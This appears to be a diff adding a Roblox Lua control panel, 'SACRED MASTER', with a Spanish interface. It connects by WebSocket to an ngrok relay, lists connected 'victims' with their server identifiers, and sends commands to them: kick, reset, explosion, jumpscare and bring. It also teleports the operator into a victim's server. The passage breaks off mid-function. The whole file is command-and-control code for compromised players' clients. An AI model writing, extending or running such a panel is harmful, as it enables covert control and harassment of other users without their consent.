@@ -1,0 +1,991 @@
+-- - Control panel
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+local WS_URL = "wss://upstairs-whenever-unveiled.ngrok-free.dev"
+
+local WS_Connect = (WebSocket and WebSocket.connect)
+    or (websocket and websocket.connect)
+    or (syn and syn.websocket and syn.websocket.connect)
+    or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
+    or (getgenv and getgenv().websocket and getgenv().websocket.connect)
+
+local connectedVictims = {}
+local selectedVictim = "TODOS"
+local wsConnected = false
+local currentSocket = nil
+local isHopping = false
+local isExecutingLua = false
+
+local safeParent = LocalPlayer:WaitForChild("PlayerGui")
+
+pcall(function()
+    local old = safeParent:FindFirstChild("SacredMasterUI")
+    if old then old:Destroy() end
+    local oldToggle = safeParent:FindFirstChild("SacredMasterToggle")
+    if oldToggle then oldToggle:Destroy() end
+end)
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "SacredMasterUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ScreenGui.DisplayOrder = 999999
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = safeParent
+
+local ToggleGui = Instance.new("ScreenGui")
+ToggleGui.Name = "SacredMasterToggle"
+ToggleGui.ResetOnSpawn = false
+ToggleGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+ToggleGui.DisplayOrder = 1000000
+ToggleGui.IgnoreGuiInset = true
+ToggleGui.Parent = safeParent
+
+local ToggleBtn = Instance.new("TextButton")
+ToggleBtn.Size = UDim2.new(0, 48, 0, 48)
+ToggleBtn.Position = UDim2.new(0, 15, 0.45, 0)
+ToggleBtn.BackgroundColor3 = Color3.fromRGB(120, 60, 220)
+ToggleBtn.Text = "\xF0\x9F\x91\x91"
+ToggleBtn.TextSize = 22
+ToggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+ToggleBtn.Font = Enum.Font.GothamBold
+ToggleBtn.Parent = ToggleGui
+
+local ToggleCorner = Instance.new("UICorner")
+ToggleCorner.CornerRadius = UDim.new(1, 0)
+ToggleCorner.Parent = ToggleBtn
+
+local ToggleStroke = Instance.new("UIStroke")
+ToggleStroke.Color = Color3.fromRGB(200, 150, 255)
+ToggleStroke.Thickness = 2
+ToggleStroke.Parent = ToggleBtn
+
+local winW = 510
+local winH = 430
+local Main = Instance.new("Frame")
+Main.Name = "MainFrame"
+Main.Size = UDim2.new(0, winW, 0, winH)
+Main.Position = UDim2.new(0.5, -math.floor(winW / 2), 0.5, -math.floor(winH / 2))
+Main.BackgroundColor3 = Color3.fromRGB(22, 18, 30)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Visible = true
+Main.Parent = ScreenGui
+
+local MainCorner = Instance.new("UICorner")
+MainCorner.CornerRadius = UDim.new(0, 10)
+MainCorner.Parent = Main
+
+local MainStroke = Instance.new("UIStroke")
+MainStroke.Color = Color3.fromRGB(130, 70, 230)
+MainStroke.Thickness = 1.5
+MainStroke.Parent = Main
+
+ToggleBtn.MouseButton1Click:Connect(function()
+    Main.Visible = not Main.Visible
+end)
+
+local function makeDraggable(topbar, frame)
+    local dragging = false
+    local dragInput, dragStart, startPos
+
+    topbar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    topbar.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UserInputService.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale,
+                startPos.X.Offset + delta.X,
+                startPos.Y.Scale,
+                startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+end
+
+local Topbar = Instance.new("Frame")
+Topbar.Name = "Topbar"
+Topbar.Size = UDim2.new(1, 0, 0, 42)
+Topbar.BackgroundColor3 = Color3.fromRGB(30, 24, 42)
+Topbar.BorderSizePixel = 0
+Topbar.Parent = Main
+makeDraggable(Topbar, Main)
+
+local TopbarCorner = Instance.new("UICorner")
+TopbarCorner.CornerRadius = UDim.new(0, 10)
+TopbarCorner.Parent = Topbar
+
+local TopbarCover = Instance.new("Frame")
+TopbarCover.Size = UDim2.new(1, 0, 0, 10)
+TopbarCover.Position = UDim2.new(0, 0, 1, -10)
+TopbarCover.BackgroundColor3 = Color3.fromRGB(30, 24, 42)
+TopbarCover.BorderSizePixel = 0
+TopbarCover.Parent = Topbar
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(0, 160, 1, 0)
+Title.Position = UDim2.new(0, 14, 0, 0)
+Title.BackgroundTransparency = 1
+Title.Text = "\xF0\x9F\x91\x91 SACRED MASTER"
+Title.TextColor3 = Color3.fromRGB(240, 230, 255)
+Title.Font = Enum.Font.GothamBlack
+Title.TextSize = 14
+Title.TextXAlignment = Enum.TextXAlignment.Left
+Title.Parent = Topbar
+
+local StatusBadge = Instance.new("TextLabel")
+StatusBadge.Size = UDim2.new(0, 220, 0, 22)
+StatusBadge.Position = UDim2.new(0, 175, 0.5, -11)
+StatusBadge.BackgroundColor3 = Color3.fromRGB(15, 12, 22)
+StatusBadge.Text = "\xF0\x9F\x9F\xA1 Conectando..."
+StatusBadge.TextColor3 = Color3.fromRGB(255, 215, 0)
+StatusBadge.Font = Enum.Font.GothamBold
+StatusBadge.TextSize = 10
+StatusBadge.Parent = Topbar
+
+local StatusCorner = Instance.new("UICorner")
+StatusCorner.CornerRadius = UDim.new(0, 4)
+StatusCorner.Parent = StatusBadge
+
+local CloseBtn = Instance.new("TextButton")
+CloseBtn.Size = UDim2.new(0, 28, 0, 28)
+CloseBtn.Position = UDim2.new(1, -34, 0.5, -14)
+CloseBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 50)
+CloseBtn.Text = "\xE2\x9C\x95"
+CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseBtn.Font = Enum.Font.GothamBold
+CloseBtn.TextSize = 13
+CloseBtn.Parent = Topbar
+
+local CloseCorner = Instance.new("UICorner")
+CloseCorner.CornerRadius = UDim.new(0, 6)
+CloseCorner.Parent = CloseBtn
+
+CloseBtn.MouseButton1Click:Connect(function()
+    Main.Visible = false
+end)
+
+local MiniBtn = Instance.new("TextButton")
+MiniBtn.Size = UDim2.new(0, 28, 0, 28)
+MiniBtn.Position = UDim2.new(1, -66, 0.5, -14)
+MiniBtn.BackgroundColor3 = Color3.fromRGB(60, 50, 80)
+MiniBtn.Text = "\xE2\x80\x94"
+MiniBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+MiniBtn.Font = Enum.Font.GothamBold
+MiniBtn.TextSize = 13
+MiniBtn.Parent = Topbar
+
+local MiniCorner = Instance.new("UICorner")
+MiniCorner.CornerRadius = UDim.new(0, 6)
+MiniCorner.Parent = MiniBtn
+
+local isMinimized = false
+MiniBtn.MouseButton1Click:Connect(function()
+    isMinimized = not isMinimized
+    if isMinimized then
+        Main.Size = UDim2.new(0, winW, 0, 42)
+    else
+        Main.Size = UDim2.new(0, winW, 0, winH)
+    end
+end)
+
+local TabBar = Instance.new("Frame")
+TabBar.Size = UDim2.new(1, -20, 0, 32)
+TabBar.Position = UDim2.new(0, 10, 0, 48)
+TabBar.BackgroundColor3 = Color3.fromRGB(20, 16, 28)
+TabBar.BorderSizePixel = 0
+TabBar.Parent = Main
+
+local TabBarCorner = Instance.new("UICorner")
+TabBarCorner.CornerRadius = UDim.new(0, 6)
+TabBarCorner.Parent = TabBar
+
+local Tab1Btn = Instance.new("TextButton")
+Tab1Btn.Size = UDim2.new(0.5, -2, 1, -4)
+Tab1Btn.Position = UDim2.new(0, 2, 0, 2)
+Tab1Btn.BackgroundColor3 = Color3.fromRGB(120, 60, 220)
+Tab1Btn.Text = "\xF0\x9F\x8E\xAF V\xC3\xADctimas y Trolls"
+Tab1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+Tab1Btn.Font = Enum.Font.GothamBold
+Tab1Btn.TextSize = 11
+Tab1Btn.Parent = TabBar
+
+local Tab1Corner = Instance.new("UICorner")
+Tab1Corner.CornerRadius = UDim.new(0, 4)
+Tab1Corner.Parent = Tab1Btn
+
+local Tab2Btn = Instance.new("TextButton")
+Tab2Btn.Size = UDim2.new(0.5, -2, 1, -4)
+Tab2Btn.Position = UDim2.new(0.5, 0, 0, 2)
+Tab2Btn.BackgroundColor3 = Color3.fromRGB(28, 22, 38)
+Tab2Btn.Text = "\xF0\x9F\x93\x9D Mensajes y Scripts"
+Tab2Btn.TextColor3 = Color3.fromRGB(180, 170, 200)
+Tab2Btn.Font = Enum.Font.GothamBold
+Tab2Btn.TextSize = 11
+Tab2Btn.Parent = TabBar
+
+local Tab2Corner = Instance.new("UICorner")
+Tab2Corner.CornerRadius = UDim.new(0, 4)
+Tab2Corner.Parent = Tab2Btn
+
+local ContentContainer = Instance.new("Frame")
+ContentContainer.Size = UDim2.new(1, -20, 1, -90)
+ContentContainer.Position = UDim2.new(0, 10, 0, 84)
+ContentContainer.BackgroundTransparency = 1
+ContentContainer.Parent = Main
+
+local Tab1Frame = Instance.new("Frame")
+Tab1Frame.Size = UDim2.new(1, 0, 1, 0)
+Tab1Frame.BackgroundTransparency = 1
+Tab1Frame.Visible = true
+Tab1Frame.Parent = ContentContainer
+
+local Tab2Frame = Instance.new("Frame")
+Tab2Frame.Size = UDim2.new(1, 0, 1, 0)
+Tab2Frame.BackgroundTransparency = 1
+Tab2Frame.Visible = false
+Tab2Frame.Parent = ContentContainer
+
+Tab1Btn.MouseButton1Click:Connect(function()
+    Tab1Frame.Visible = true
+    Tab2Frame.Visible = false
+    Tab1Btn.BackgroundColor3 = Color3.fromRGB(120, 60, 220)
+    Tab1Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Tab2Btn.BackgroundColor3 = Color3.fromRGB(28, 22, 38)
+    Tab2Btn.TextColor3 = Color3.fromRGB(180, 170, 200)
+end)
+
+Tab2Btn.MouseButton1Click:Connect(function()
+    Tab1Frame.Visible = false
+    Tab2Frame.Visible = true
+    Tab2Btn.BackgroundColor3 = Color3.fromRGB(120, 60, 220)
+    Tab2Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Tab1Btn.BackgroundColor3 = Color3.fromRGB(28, 22, 38)
+    Tab1Btn.TextColor3 = Color3.fromRGB(180, 170, 200)
+end)
+
+local MainScroll = Instance.new("ScrollingFrame")
+MainScroll.Size = UDim2.new(1, 0, 1, 0)
+MainScroll.BackgroundTransparency = 1
+MainScroll.BorderSizePixel = 0
+MainScroll.ScrollBarThickness = 4
+MainScroll.ScrollBarImageColor3 = Color3.fromRGB(120, 60, 220)
+MainScroll.CanvasSize = UDim2.new(0, 0, 0, 750)
+MainScroll.Parent = Tab1Frame
+
+local TargetHeader = Instance.new("Frame")
+TargetHeader.Size = UDim2.new(1, 0, 0, 36)
+TargetHeader.Position = UDim2.new(0, 0, 0, 2)
+TargetHeader.BackgroundColor3 = Color3.fromRGB(28, 22, 38)
+TargetHeader.BorderSizePixel = 0
+TargetHeader.Parent = MainScroll
+
+local TargetCorner = Instance.new("UICorner")
+TargetCorner.CornerRadius = UDim.new(0, 6)
+TargetCorner.Parent = TargetHeader
+
+local TargetDisplay = Instance.new("TextLabel")
+TargetDisplay.Size = UDim2.new(0.5, -5, 1, 0)
+TargetDisplay.Position = UDim2.new(0, 8, 0, 0)
+TargetDisplay.BackgroundTransparency = 1
+TargetDisplay.Text = "\xF0\x9F\x8E\xAF OBJETIVO: TODOS"
+TargetDisplay.TextColor3 = Color3.fromRGB(140, 255, 170)
+TargetDisplay.Font = Enum.Font.GothamBold
+TargetDisplay.TextSize = 12
+TargetDisplay.TextXAlignment = Enum.TextXAlignment.Left
+TargetDisplay.Parent = TargetHeader
+
+local SelectAllBtn = Instance.new("TextButton")
+SelectAllBtn.Size = UDim2.new(0, 75, 0, 24)
+SelectAllBtn.Position = UDim2.new(1, -192, 0.5, -12)
+SelectAllBtn.BackgroundColor3 = Color3.fromRGB(80, 45, 120)
+SelectAllBtn.Text = "\xF0\x9F\x91\xA5 Todos"
+SelectAllBtn.TextColor3 = Color3.fromRGB(240, 230, 255)
+SelectAllBtn.Font = Enum.Font.GothamBold
+SelectAllBtn.TextSize = 10
+SelectAllBtn.Parent = TargetHeader
+
+local SelectAllCorner = Instance.new("UICorner")
+SelectAllCorner.CornerRadius = UDim.new(0, 4)
+SelectAllCorner.Parent = SelectAllBtn
+
+local RefreshVictimsBtn = Instance.new("TextButton")
+RefreshVictimsBtn.Size = UDim2.new(0, 105, 0, 24)
+RefreshVictimsBtn.Position = UDim2.new(1, -112, 0.5, -12)
+RefreshVictimsBtn.BackgroundColor3 = Color3.fromRGB(40, 120, 80)
+RefreshVictimsBtn.Text = "\xF0\x9F\x94\x84 Buscar V\xC3\xADctimas"
+RefreshVictimsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+RefreshVictimsBtn.Font = Enum.Font.GothamBold
+RefreshVictimsBtn.TextSize = 10
+RefreshVictimsBtn.Parent = TargetHeader
+
+local RefreshVictimsCorner = Instance.new("UICorner")
+RefreshVictimsCorner.CornerRadius = UDim.new(0, 4)
+RefreshVictimsCorner.Parent = RefreshVictimsBtn
+
+local InfoBar = Instance.new("Frame")
+InfoBar.Size = UDim2.new(1, 0, 0, 22)
+InfoBar.Position = UDim2.new(0, 0, 0, 42)
+InfoBar.BackgroundColor3 = Color3.fromRGB(18, 14, 25)
+InfoBar.BorderSizePixel = 0
+InfoBar.Parent = MainScroll
+
+local InfoBarCorner = Instance.new("UICorner")
+InfoBarCorner.CornerRadius = UDim.new(0, 4)
+InfoBarCorner.Parent = InfoBar
+
+local InfoBarText = Instance.new("TextLabel")
+InfoBarText.Size = UDim2.new(1, -10, 1, 0)
+InfoBarText.Position = UDim2.new(0, 6, 0, 0)
+InfoBarText.BackgroundTransparency = 1
+InfoBarText.Text = string.format("Mi Place: %s | GameId: %s", tostring(game.PlaceId), tostring(game.GameId))
+InfoBarText.TextColor3 = Color3.fromRGB(180, 170, 210)
+InfoBarText.Font = Enum.Font.Code
+InfoBarText.TextSize = 9
+InfoBarText.TextXAlignment = Enum.TextXAlignment.Left
+InfoBarText.Parent = InfoBar
+
+local VictimsBox = Instance.new("Frame")
+VictimsBox.Size = UDim2.new(1, 0, 0, 145)
+VictimsBox.Position = UDim2.new(0, 0, 0, 68)
+VictimsBox.BackgroundColor3 = Color3.fromRGB(26, 20, 36)
+VictimsBox.BorderSizePixel = 0
+VictimsBox.Parent = MainScroll
+
+local VictimsBoxCorner = Instance.new("UICorner")
+VictimsBoxCorner.CornerRadius = UDim.new(0, 6)
+VictimsBoxCorner.Parent = VictimsBox
+
+local VictimsBoxStroke = Instance.new("UIStroke")
+VictimsBoxStroke.Color = Color3.fromRGB(50, 40, 70)
+VictimsBoxStroke.Thickness = 1
+VictimsBoxStroke.Parent = VictimsBox
+
+local VictimsScroll = Instance.new("ScrollingFrame")
+VictimsScroll.Size = UDim2.new(1, -10, 1, -10)
+VictimsScroll.Position = UDim2.new(0, 5, 0, 5)
+VictimsScroll.BackgroundTransparency = 1
+VictimsScroll.BorderSizePixel = 0
+VictimsScroll.ScrollBarThickness = 3
+VictimsScroll.ScrollBarImageColor3 = Color3.fromRGB(120, 60, 220)
+VictimsScroll.Parent = VictimsBox
+
+local VictimsLayout = Instance.new("UIListLayout")
+VictimsLayout.Padding = UDim.new(0, 4)
+VictimsLayout.Parent = VictimsScroll
+
+local isConnecting = false
+local function connectWS()
+    if isConnecting then return end
+    isConnecting = true
+
+    pcall(function()
+        if currentSocket then currentSocket:Close() end
+    end)
+    currentSocket = nil
+    wsConnected = false
+
+    if not WS_Connect then
+        StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Sin WS"
+        StatusBadge.TextColor3 = Color3.fromRGB(255, 170, 0)
+        isConnecting = false
+        return false
+    end
+
+    local ok, s = pcall(function() return WS_Connect(WS_URL) end)
+    if ok and s then
+        currentSocket = s
+        wsConnected = true
+        StatusBadge.Text = "\xF0\x9F\x9F\xA2 Conectado (Ngrok)"
+        StatusBadge.TextColor3 = Color3.fromRGB(80, 255, 120)
+
+        pcall(function()
+            s.OnMessage:Connect(function(msg)
+                local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
+                if success and data then
+                    if (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
+                        connectedVictims[data.username] = {
+                            username = data.username,
+                            placeId = data.placeId,
+                            gameId = data.gameId,
+                            jobId = data.jobId,
+                            lastSeen = tick()
+                        }
+                        if rebuildVictimsUI then rebuildVictimsUI() end
+                    elseif data.type == "cmd_ack" then
+                        StatusBadge.Text = "\xE2\x9A\xA1 " .. tostring(data.username) .. ": " .. tostring(data.action) .. " (" .. tostring(data.status) .. ")"
+                        StatusBadge.TextColor3 = Color3.fromRGB(80, 255, 120)
+                    end
+                end
+            end)
+        end)
+
+        pcall(function()
+            s.OnClose:Connect(function()
+                wsConnected = false
+                currentSocket = nil
+                StatusBadge.Text = "\xF0\x9F\x94\xB4 Desconectado"
+                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+            end)
+        end)
+
+        pcall(function()
+            s:Send(HttpService:JSONEncode({type = "ping_victims"}))
+        end)
+
+        isConnecting = false
+        return true
+    end
+
+    wsConnected = false
+    StatusBadge.Text = "\xF0\x9F\x94\xB4 Desconectado"
+    StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+    isConnecting = false
+    return false
+end
+
+TeleportService.TeleportInitFailed:Connect(function(player, result, msg)
+    isHopping = false
+    StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Error TP: " .. tostring(msg or result or "Rechazado")
+    StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+    task.spawn(function()
+        task.wait(1)
+        if not wsConnected or not currentSocket then
+            connectWS()
+        end
+    end)
+end)
+
+local function hopServer(placeId, jobId)
+    if isHopping then return end
+    local pid = tonumber(placeId)
+    local jid = tostring(jobId or "")
+    if not pid or jid == "" or #jid < 5 then
+        StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F JobId no disponible"
+        StatusBadge.TextColor3 = Color3.fromRGB(255, 170, 0)
+        return
+    end
+
+    isHopping = true
+    StatusBadge.Text = "\xF0\x9F\x9A\x80 Entrando a instancia..."
+    StatusBadge.TextColor3 = Color3.fromRGB(140, 200, 255)
+
+    task.spawn(function()
+        if game.PlaceId == pid then
+            local tpOk, tpErr = pcall(function()
+                TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer)
+            end)
+            if not tpOk then
+                StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Teleport fall\xC3\xB3: " .. tostring(tpErr)
+                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+            end
+        else
+            local tpOk, tpErr = pcall(function()
+                TeleportService:Teleport(pid, LocalPlayer)
+            end)
+            if not tpOk then
+                StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Error TP: " .. tostring(tpErr or "Fall\xC3\xB3")
+                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+            end
+        end
+        task.wait(5)
+        isHopping = false
+        if not wsConnected or not currentSocket then
+            connectWS()
+        end
+    end)
+end
+
+local function sendCmd(action, extra)
+    if not wsConnected or not currentSocket then
+        connectWS()
+        local waited = 0
+        while (not wsConnected or not currentSocket) and waited < 3 do
+            task.wait(0.2)
+            waited = waited + 0.2
+        end
+    end
+    if not currentSocket or not wsConnected then
+        StatusBadge.Text = "\xF0\x9F\x94\xB4 No hay conexi\xC3\xB3n"
+        StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+        return false
+    end
+    local cmdId = tostring(os.time()) .. "_" .. tostring(math.random(100000, 999999))
+    local payload = {
+        type = "master_command",
+        action = action,
+        target = selectedVictim,
+        cmd_id = cmdId
+    }
+    if extra then
+        for k, v in pairs(extra) do payload[k] = v end
+    end
+    local raw = HttpService:JSONEncode(payload)
+    local ok = pcall(function() currentSocket:Send(raw) end)
+    if not ok then
+        wsConnected = false
+        currentSocket = nil
+        connectWS()
+        task.wait(0.4)
+        if currentSocket and wsConnected then
+            pcall(function() currentSocket:Send(raw) end)
+        end
+    end
+    return ok
+end
+
+function rebuildVictimsUI()
+    for _, c in ipairs(VictimsScroll:GetChildren()) do
+        if c:IsA("Frame") or c:IsA("TextLabel") then c:Destroy() end
+    end
+    local count = 0
+    for name, info in pairs(connectedVictims) do
+        count = count + 1
+        local isSelected = (selectedVictim == name)
+        local card = Instance.new("Frame")
+        card.Size = UDim2.new(1, -6, 0, 42)
+        card.BackgroundColor3 = isSelected and Color3.fromRGB(60, 35, 90) or Color3.fromRGB(34, 26, 46)
+        card.BorderSizePixel = 0
+        card.Parent = VictimsScroll
+
+        local cCorner = Instance.new("UICorner")
+        cCorner.CornerRadius = UDim.new(0, 4)
+        cCorner.Parent = card
+
+        local cStroke = Instance.new("UIStroke")
+        cStroke.Color = isSelected and Color3.fromRGB(160, 90, 255) or Color3.fromRGB(50, 40, 65)
+        cStroke.Thickness = isSelected and 1.5 or 1
+        cStroke.Parent = card
+
+        local nLabel = Instance.new("TextLabel")
+        nLabel.Size = UDim2.new(0, 150, 0, 18)
+        nLabel.Position = UDim2.new(0, 8, 0, 2)
+        nLabel.BackgroundTransparency = 1
+        nLabel.Text = "\xF0\x9F\x91\xA4 " .. name
+        nLabel.TextColor3 = Color3.fromRGB(240, 235, 255)
+        nLabel.Font = Enum.Font.GothamBold
+        nLabel.TextSize = 11
+        nLabel.TextXAlignment = Enum.TextXAlignment.Left
+        nLabel.Parent = card
+
+        local subInfo = Instance.new("TextLabel")
+        subInfo.Size = UDim2.new(0, 180, 0, 16)
+        subInfo.Position = UDim2.new(0, 8, 0, 20)
+        subInfo.BackgroundTransparency = 1
+        local isSameGame = (game.PlaceId == tonumber(info.placeId))
+        local sameText = isSameGame and "[Mismo]" or "[Otro]"
+        local jidShort = tostring(info.jobId or "")
+        if #jidShort > 10 then jidShort = string.sub(jidShort, 1, 8) .. ".." end
+        subInfo.Text = string.format("%s P:%s J:%s", sameText, tostring(info.placeId or "?"), jidShort)
+        subInfo.TextColor3 = isSameGame and Color3.fromRGB(120, 240, 160) or Color3.fromRGB(240, 180, 100)
+        subInfo.Font = Enum.Font.Code
+        subInfo.TextSize = 8
+        subInfo.TextXAlignment = Enum.TextXAlignment.Left
+        subInfo.Parent = card
+
+        local selBtn = Instance.new("TextButton")
+        selBtn.Size = UDim2.new(0, 56, 0, 26)
+        selBtn.Position = UDim2.new(1, -196, 0.5, -13)
+        selBtn.BackgroundColor3 = isSelected and Color3.fromRGB(150, 80, 255) or Color3.fromRGB(80, 40, 140)
+        selBtn.Text = isSelected and "\xE2\x9C\x85 Listo" or "\xF0\x9F\x8E\xAF Elegir"
+        selBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        selBtn.Font = Enum.Font.GothamBold
+        selBtn.TextSize = 9
+        selBtn.Parent = card
+
+        local selCorner = Instance.new("UICorner")
+        selCorner.CornerRadius = UDim.new(0, 4)
+        selCorner.Parent = selBtn
+
+        selBtn.MouseButton1Click:Connect(function()
+            selectedVictim = name
+            TargetDisplay.Text = "\xF0\x9F\x8E\xAF OBJETIVO: " .. name
+            rebuildVictimsUI()
+        end)
+
+        local hopBtn = Instance.new("TextButton")
+        hopBtn.Size = UDim2.new(0, 80, 0, 26)
+        hopBtn.Position = UDim2.new(1, -136, 0.5, -13)
+        hopBtn.BackgroundColor3 = isSameGame and Color3.fromRGB(35, 125, 85) or Color3.fromRGB(130, 80, 30)
+        hopBtn.Text = isSameGame and "\xF0\x9F\x9A\x80 Ir a su Serv" or "\xF0\x9F\x8E\xAE Ir a Juego"
+        hopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        hopBtn.Font = Enum.Font.GothamBold
+        hopBtn.TextSize = 9
+        hopBtn.Parent = card
+
+        local hopCorner = Instance.new("UICorner")
+        hopCorner.CornerRadius = UDim.new(0, 4)
+        hopCorner.Parent = hopBtn
+
+        hopBtn.MouseButton1Click:Connect(function()
+            hopServer(info.placeId, info.jobId)
+        end)
+
+        local copyBtn = Instance.new("TextButton")
+        copyBtn.Size = UDim2.new(0, 50, 0, 26)
+        copyBtn.Position = UDim2.new(1, -52, 0.5, -13)
+        copyBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 75)
+        copyBtn.Text = "\xF0\x9F\x93\x8B Copiar"
+        copyBtn.TextColor3 = Color3.fromRGB(220, 220, 240)
+        copyBtn.Font = Enum.Font.GothamBold
+        copyBtn.TextSize = 9
+        copyBtn.Parent = card
+
+        local copyCorner = Instance.new("UICorner")
+        copyCorner.CornerRadius = UDim.new(0, 4)
+        copyCorner.Parent = copyBtn
+
+        copyBtn.MouseButton1Click:Connect(function()
+            pcall(function()
+                if setclipboard then
+                    setclipboard(string.format('game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)', tonumber(info.placeId) or 0, tostring(info.jobId or "")))
+                    StatusBadge.Text = "\xF0\x9F\x93\x8B \xC2\xA1Comando Copiado!"
+                    StatusBadge.TextColor3 = Color3.fromRGB(120, 240, 160)
+                end
+            end)
+        end)
+    end
+
+    if count == 0 then
+        local empty = Instance.new("TextLabel")
+        empty.Size = UDim2.new(1, 0, 1, 0)
+        empty.BackgroundTransparency = 1
+        empty.Text = "Ninguna v\xC3\xADctima conectada. Haz clic en 'Buscar V\xC3\xADctimas'."
+        empty.TextColor3 = Color3.fromRGB(160, 150, 180)
+        empty.Font = Enum.Font.Gotham
+        empty.TextSize = 11
+        empty.Parent = VictimsScroll
+    end
+    VictimsScroll.CanvasSize = UDim2.new(0, 0, 0, math.max(120, count * 46))
+end
+
+SelectAllBtn.MouseButton1Click:Connect(function()
+    selectedVictim = "TODOS"
+    TargetDisplay.Text = "\xF0\x9F\x8E\xAF OBJETIVO: TODOS"
+    rebuildVictimsUI()
+end)
+
+rebuildVictimsUI()
+
+local function refreshList()
+    if not wsConnected then connectWS() end
+    if currentSocket and wsConnected then
+        pcall(function()
+            currentSocket:Send(HttpService:JSONEncode({type = "ping_victims"}))
+        end)
+    end
+    task.wait(0.8)
+    local now = tick()
+    for name, info in pairs(connectedVictims) do
+        if now - (info.lastSeen or now) > 90 then
+            connectedVictims[name] = nil
+        end
+    end
+    rebuildVictimsUI()
+end
+
+RefreshVictimsBtn.MouseButton1Click:Connect(function()
+    task.spawn(refreshList)
+end)
+
+local SectionLabel = Instance.new("TextLabel")
+SectionLabel.Size = UDim2.new(1, 0, 0, 22)
+SectionLabel.Position = UDim2.new(0, 0, 0, 220)
+SectionLabel.BackgroundTransparency = 1
+SectionLabel.Text = "\xE2\x9A\xA1 ACCIONES DE TROLLING"
+SectionLabel.TextColor3 = Color3.fromRGB(200, 180, 240)
+SectionLabel.Font = Enum.Font.GothamBold
+SectionLabel.TextSize = 11
+SectionLabel.TextXAlignment = Enum.TextXAlignment.Left
+SectionLabel.Parent = MainScroll
+
+local GridFrame = Instance.new("Frame")
+GridFrame.Size = UDim2.new(1, 0, 0, 460)
+GridFrame.Position = UDim2.new(0, 0, 0, 246)
+GridFrame.BackgroundTransparency = 1
+GridFrame.Parent = MainScroll
+
+local Grid = Instance.new("UIGridLayout")
+Grid.CellSize = UDim2.new(0.5, -4, 0, 34)
+Grid.CellPadding = UDim2.new(0, 6, 0, 6)
+Grid.Parent = GridFrame
+
+local function makeActionBtn(name, color, callback)
+    local b = Instance.new("TextButton")
+    b.Size = UDim2.new(1, 0, 1, 0)
+    b.BackgroundColor3 = color or Color3.fromRGB(38, 30, 52)
+    b.Text = name
+    b.TextColor3 = Color3.fromRGB(245, 240, 255)
+    b.Font = Enum.Font.GothamBold
+    b.TextSize = 11
+    b.Parent = GridFrame
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, 6)
+    c.Parent = b
+    local s = Instance.new("UIStroke")
+    s.Color = Color3.fromRGB(60, 48, 80)
+    s.Thickness = 1
+    s.Parent = b
+    local btnDebounce = false
+    b.MouseButton1Click:Connect(function()
+        if btnDebounce then return end
+        btnDebounce = true
+        pcall(callback)
+        local orig = b.BackgroundColor3
+        b.BackgroundColor3 = Color3.fromRGB(160, 90, 255)
+        task.delay(0.6, function()
+            pcall(function()
+                b.BackgroundColor3 = orig
+                btnDebounce = false
+            end)
+        end)
+    end)
+    return b
+end
+
+makeActionBtn("\xF0\x9F\x92\xA5 Explosi\xC3\xB3n Espacial", Color3.fromRGB(90, 30, 40), function() sendCmd("explosion") end)
+makeActionBtn("\xF0\x9F\x9B\x91 Kick Real del Server", Color3.fromRGB(130, 25, 25), function() sendCmd("kick") end)
+makeActionBtn("\xF0\x9F\x92\x80 Reset Personaje", Color3.fromRGB(110, 35, 45), function() sendCmd("reset_character") end)
+makeActionBtn("\xF0\x9F\xA9\xB8 Jumpscare Terror", Color3.fromRGB(100, 20, 30), function() sendCmd("red_scare") end)
+makeActionBtn("\xE2\x9E\xA1\xEF\xB8\x8F Bring (A mi posici\xC3\xB3n)", Color3.fromRGB(35, 75, 110), function()
+    local char = LocalPlayer.Character
